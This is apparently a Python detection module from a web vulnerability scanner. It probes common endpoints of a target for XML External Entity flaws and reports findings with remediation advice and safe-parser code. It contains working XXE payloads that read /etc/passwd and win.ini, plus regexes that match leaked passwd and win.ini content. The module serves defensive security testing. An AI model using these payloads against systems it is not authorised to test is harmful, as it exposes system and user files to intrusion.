"""
XXE Out-of-Band & Blind Detection Module (v1.7.0)
Error-based, local file read, and blind XXE detection.
"""
from __future__ import annotations
import re
from typing import List
from urllib.parse import urlparse
from webshield.core.models import Finding, Severity
from webshield.core.http import get_client

PASSWD_PATTERN = re.compile(r"root:[x*]?:0:0:|/bin/bash|/bin/sh", re.I)
WIN_INI_PATTERN = re.compile(r"\[fonts\]|\[extensions\]|\[mci", re.I)
XML_ERROR_PATTERN = re.compile(
    r"XML.*error|SAXParseException|XMLSyntaxError|unterminated entity|"
    r"entity.*not.*defined|malformed XML|XML parsing|DOMException|"
    r"javax\.xml|org\.xml\.sax|System\.Xml", re.I
)

XXE_PAYLOADS = [
    (
        "linux_file_read",
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        PASSWD_PATTERN, Severity.CRITICAL, 9.8,
        "XXE — Local File Read (/etc/passwd)",
        "XXE injection allows reading /etc/passwd, revealing system users and paths.",
    ),
    (
        "windows_file_read",
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">]><foo>&xxe;</foo>',
        WIN_INI_PATTERN, Severity.CRITICAL, 9.8,
        "XXE — Local File Read (C:\\Windows\\win.ini)",
        "XXE injection allows reading Windows system files.",
    ),
    (
        "error_based",
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///nonexistent_xxe_probe_file">]><foo>&xxe;</foo>',
        XML_ERROR_PATTERN, Severity.HIGH, 7.5,
        "XXE — XML Parser Error Leaked (Blind Indicator)",
        "The XML parser returns errors when processing external entities, indicating XXE may be possible.",
    ),
    (
        "parameter_entity",
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]><foo/>',
        PASSWD_PATTERN, Severity.CRITICAL, 9.8,
        "XXE — Parameter Entity File Read",
        "Parameter entity XXE allows reading local files via % entity syntax.",
    ),
]

XML_ACCEPT_PATTERN = re.compile(r"xml|text/xml|application/xml", re.I)

INJECT_PATHS = [
    "/",
    "/api",
    "/api/v1",
    "/upload",
    "/import",
    "/api/upload",
    "/api/import",
    "/xmlrpc.php",
    "/api/xml",
    "/soap",
    "/ws",
]

CONTENT_TYPES = [
    "application/xml",
    "text/xml",
    "application/soap+xml",
]


def scan(url: str, timeout: float = 10.0) -> List[Finding]:
    findings: List[Finding] = []
    parsed   = urlparse(url)
    base_url = f"{parsed.scheme}://{parsed.netloc}"

    with get_client(timeout=min(timeout, 8.0)) as client:
        for path in INJECT_PATHS:
            test_url = base_url + path
            for ct in CONTENT_TYPES:
                for (name, payload, pattern, severity, cvss, title, desc) in XXE_PAYLOADS:
                    try:
                        resp = client.post(
                            test_url,
                            content=payload.encode(),
                            headers={"Content-Type": ct, "Accept": "application/xml,*/*"},
                        )
                        body = resp.text
                        if pattern.search(body):
                            findings.append(Finding(
                                title=f"{title} — {path}",
                                severity=severity,
                                description=(
                                    f"{desc}\n\n"
                                    f"Endpoint: POST {path} with Content-Type: {ct}"
                                ),
                                evidence=(
                                    f"URL: {test_url}\n"
                                    f"Content-Type: {ct}\n"
                                    f"Payload type: {name}\n"
                                    f"Response snippet: {body[:200]}"
                                ),
                                remediation=(
                                    "Disable external entity processing in your XML parser:\n"
                                    "• Java (DocumentBuilderFactory): setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true)\n"
                                    "• Python (lxml): resolve_entities=False\n"
                                    "• PHP: libxml_disable_entity_loader(true)"
                                ),
                                code_fix=(
                                    "# Python lxml — safe parsing:\n"
                                    "from lxml import etree\n"
                                    "parser = etree.XMLParser(\n"
                                    "    resolve_entities=False,\n"
                                    "    no_network=True,\n"
                                    "    load_dtd=False,\n"
                                    ")\n"
                                    "tree = etree.fromstring(xml_data, parser)\n\n"
                                    "# Java — disable external entities:\n"
                                    "factory.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true);"
                                ),
                                reference="https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing",
                                module="xxe_oob",
                                cvss=cvss,
                            ))
                            return findings  # one confirmed finding is enough
                    except Exception:
                        continue

                # Check if endpoint accepts XML at all (INFO)
                try:
                    resp = client.post(
                        test_url,
                        content=b"<test/>",
                        headers={"Content-Type": ct},
                    )
                    if resp.status_code not in (404, 405, 415) and XML_ERROR_PATTERN.search(resp.text):
                        findings.append(Finding(
                            title=f"XML Parsing Endpoint Detected — Potential XXE ({path})",
                            severity=Severity.MEDIUM,
                            description=(
                                f"The endpoint {path} appears to parse XML (returned XML-related error). "
                                "Manual XXE testing is recommended."
                            ),
                            evidence=f"POST {test_url} with XML → HTTP {resp.status_code}\n{resp.text[:150]}",
                            remediation="Disable external entity processing in XML parsers.",
                            code_fix="parser = etree.XMLParser(resolve_entities=False, no_network=True)",
                            reference="https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing",
                            module="xxe_oob",
                            cvss=5.3,
                        ))
                        return findings
                except Exception:
                    continue

    return findings
